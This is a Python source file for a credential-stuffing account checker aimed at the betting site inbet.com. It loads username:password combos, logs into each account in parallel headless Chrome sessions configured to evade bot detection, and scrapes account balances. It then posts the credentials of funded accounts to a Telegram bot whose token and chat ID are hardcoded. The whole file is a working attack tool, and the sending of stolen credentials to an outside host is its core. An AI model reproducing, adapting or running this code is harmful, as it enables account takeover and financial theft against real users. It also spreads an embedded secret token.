# file: telegrambalance3_fixed.py
import os
import re
import time
import json
import winsound
import random
import shutil
import tkinter as tk
import traceback
import threading
import requests
import keyboard
from tkinter import messagebox
from datetime import datetime
from concurrent.futures import ProcessPoolExecutor, as_completed

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service as ChromeService
import undetected_chromedriver as uc

# ==================== CONFIG ====================
TELEGRAM_BOT_TOKEN = "8261371308:AAEzFjN1Ufsr8yI6iY08gMLo5Va55lO_Guo"
TELEGRAM_CHAT_ID = "7752036982"
MAX_WORKERS = 10
HEADLESS_MODE = True
COOKIES_DIR = "profiles"
LOGIN_URL = "https://www.inbet.com/sports"
CREDENTIALS_FILE = "unique.txt"
#CREDENTIALS_FILE = "uniquecredentials1.txt"
SUCCESS_FILE = r"C:\Inbet\PatrickAIPlatinum.txt"
# =================================================

stop_flag = False


# ==================== UTILITIES ====================
def send_telegram(username, password, balance, timestamp):
    try:
        msg = f"🚨Inbet Balance Alert!\nUser: {username}:{password}\nBalance: {balance}\nTime: {timestamp}"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": msg
        })
        print(f"[TELEGRAM] Alert sent for {username}:{password}")
    except Exception as e:
        print(f"[ERROR] Telegram send failed: {e}")


def read_credentials(file_path):
    if not os.path.exists(file_path):
        print(f"[ERROR] Missing {file_path}")
        return []
    with open(file_path, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip()]
    creds = [tuple(line.split(':', 1)) for line in lines if ':' in line]
    print(f"[INFO] Loaded {len(creds)} credentials.")
    return creds


_driver_service = None

def create_driver(id_: int, profile_path: str, headless=True):
    os.makedirs(profile_path, exist_ok=True)

    # Временна директория за кеш и логове
    temp_dir = os.path.abspath(os.path.join("temp_drivers", f"driver_{id_}"))
    os.makedirs(temp_dir, exist_ok=True)

    # Ръчно указваме пътя до сваления ChromeDriver
    driver_path = r"C:\Inbet\chromedriver.exe"
    if not os.path.exists(driver_path):
        raise FileNotFoundError(f"ChromeDriver not found at {driver_path}")

    # Настройки за Chrome
    options = uc.ChromeOptions()
    options.add_argument(f"--user-data-dir={os.path.abspath(profile_path)}")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-infobars")
    options.add_argument("--remote-debugging-port=0")
    options.add_argument("--disable-notifications")
    options.add_argument(f"--window-position={id_ * 40},{id_ * 40}")
    if headless:
        options.add_argument("--headless=new")

    # 🚀 Използваме директно Service с посочен chromedriver.exe
    service = ChromeService(executable_path=driver_path)

    # Стартираме undetected Chrome с ръчно зададен драйвер
    driver = uc.Chrome(service=service, options=options, driver_executable_path=driver_path, version_main=142)

    driver.set_window_size(1920, 1080)
    return driver

def save_cookies(driver, path):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(driver.get_cookies(), f)
    except Exception as e:
        print(f"[WARN] Could not save cookies: {e}")


def load_cookies(driver, path):
    if not os.path.exists(path):
        return False
    try:
        driver.get(LOGIN_URL)
        with open(path, 'r', encoding='utf-8') as f:
            cookies = json.load(f)
        for cookie in cookies:
            driver.add_cookie(cookie)
        driver.refresh()
        return True
    except Exception as e:
        print(f"[WARN] Failed to load cookies: {e}")
        return False


def wait_for(driver, locator, condition, timeout=30):
    try:
        return WebDriverWait(driver, timeout).until(condition(locator))
    except:
        return None


# ==================== LOGIN ====================
def login(credentials, login_page_url, success_logins_file):
    username, password = credentials
    profile_path = os.path.join(COOKIES_DIR, username.replace("@", "_"))
    cookies_file = os.path.join(profile_path, "cookies.json")
    driver = create_driver(random.randint(1, 1000), profile_path, HEADLESS_MODE)

    try:
        # Try to auto-login with cookies
        if load_cookies(driver, cookies_file):
            print(f"[INFO] Loaded cookies for {username}")
            success_marker = wait_for(driver, (By.CSS_SELECTOR, "div.nav-user__logged-in"),
                                      EC.visibility_of_element_located, 8)
            if success_marker:
                print(f"[LOGIN OK] Auto-login success for {username}")
            else:
                print(f"[INFO] Cookies invalid, manual login for {username}")
        else:
            driver.get(login_page_url)

        # If still not logged in, perform manual login
        success_marker = wait_for(driver, (By.CSS_SELECTOR, "div.nav-user__logged-in"),
                                  EC.visibility_of_element_located, 8)
        if not success_marker:
            btn_login = wait_for(driver,
                                 (By.XPATH, "/html/body/div[3]/div[2]/div/nav/div/div/div[3]/div[2]/button[2]"),
                                 EC.element_to_be_clickable)
            if btn_login:
                driver.execute_script("arguments[0].click();", btn_login)
                usr = wait_for(driver,
                               (By.XPATH, "//input[@name='username' or contains(@placeholder,'Потребител')]"),
                               EC.visibility_of_element_located)
                pwd = wait_for(driver,
                               (By.XPATH, "//input[@type='password']"),
                               EC.visibility_of_element_located)
                if usr and pwd:
                    usr.clear()
                    usr.send_keys(username)
                    pwd.clear()
                    pwd.send_keys(password)
                    btn_submit = wait_for(driver,
                                          (By.XPATH, "//form//button[contains(@class,'btn') and not(@disabled)]"),
                                          EC.element_to_be_clickable)
                    if btn_submit:
                        driver.execute_script("arguments[0].click();", btn_submit)
                        time.sleep(3)

            success_marker = wait_for(driver, (By.CSS_SELECTOR, "div.nav-user__logged-in"),
                                      EC.visibility_of_element_located, 10)

        if not success_marker:
            print(f"[LOGIN FAIL] Invalid credentials for {username}")
            driver.quit()
            return

        # ✅ Save cookies after successful login
        save_cookies(driver, cookies_file)

        # ✅ Extract balance
        elm_balance = wait_for(driver, (By.CSS_SELECTOR, "div.nav-user__logged-in"), EC.visibility_of_element_located)
        balance = "0.00"
        if elm_balance:
            txt = elm_balance.text
            match = re.search(r'\d+(?:[.,]\d+)?', txt)
            if match:
                balance = f"{float(match.group().replace(',', '.')):.2f}"

        # ✅ Balance alert
        val = float(balance)
        if val > 0.99:
            winsound.PlaySound(r"C:\Inbet\inbet.wav",
                               winsound.SND_FILENAME | winsound.SND_ASYNC)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            send_telegram(username, password, balance, timestamp)

        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(success_logins_file, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {username}:{password} - Balance: {balance}\n")

        print(f"[OK] {username} - Balance {balance}")

    except Exception:
        traceback.print_exc()
    finally:
        driver.quit()


# ==================== UI ====================
def emergency_stop_listener():
    global stop_flag
    buffer = []
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and event.name == 'i':
            buffer.append(time.time())
            buffer = [t for t in buffer if time.time() - t < 3]
            if len(buffer) >= 5:
                print("\n[EMERGENCY STOP] 's' pressed 5× — shutting down.")
                stop_flag = True
                os._exit(0)


def config_popup():
    def on_submit():
        global MAX_WORKERS, HEADLESS_MODE
        try:
            MAX_WORKERS = int(entry_workers.get())
            HEADLESS_MODE = bool(headless_var.get())
            root.destroy()
        except ValueError:
            messagebox.showerror("Error", "Enter a valid number!")

    def on_reset():
        if messagebox.askyesno("Confirm", "Delete all saved profiles & cookies?"):
            shutil.rmtree(COOKIES_DIR, ignore_errors=True)
            os.makedirs(COOKIES_DIR, exist_ok=True)
            messagebox.showinfo("Done", "Profiles reset successfully.")

    root = tk.Tk()
    root.title("Sesame Config")

    tk.Label(root, text="Max Workers:").pack(pady=5)
    entry_workers = tk.Entry(root)
    entry_workers.insert(0, str(MAX_WORKERS))
    entry_workers.pack(pady=5)

    headless_var = tk.IntVar(value=1 if HEADLESS_MODE else 0)
    tk.Checkbutton(root, text="Run Headless", variable=headless_var).pack(pady=5)

    tk.Button(root, text="Start", command=on_submit, bg="#4CAF50", fg="white").pack(pady=5)
    tk.Button(root, text="Reset Profiles", command=on_reset, bg="#f44336", fg="white").pack(pady=5)

    root.mainloop()


# ==================== MAIN ====================
def main():
    # Покажи popup за конфигурация
    config_popup()

    # Зареждаме акаунтите
    creds = read_credentials(CREDENTIALS_FILE)
    if not creds:
        return

    # Подготвяме папки
    os.makedirs(os.path.dirname(SUCCESS_FILE), exist_ok=True)
    os.makedirs(COOKIES_DIR, exist_ok=True)
    shutil.rmtree("temp_drivers", ignore_errors=True)
    os.makedirs("temp_drivers", exist_ok=True)

    # Стартираме listener за аварийно спиране
    threading.Thread(target=emergency_stop_listener, daemon=True).start()

    print(f"[INFO] Starting with {MAX_WORKERS} workers (headless={HEADLESS_MODE})...")

    # 🚀 Стартиране на процеси с изолирани драйвери
    with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(login, cred, LOGIN_URL, SUCCESS_FILE) for cred in creds]
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                print(f"[ERROR] Worker failed: {e}")

if __name__ == "__main__":
    main()
    
    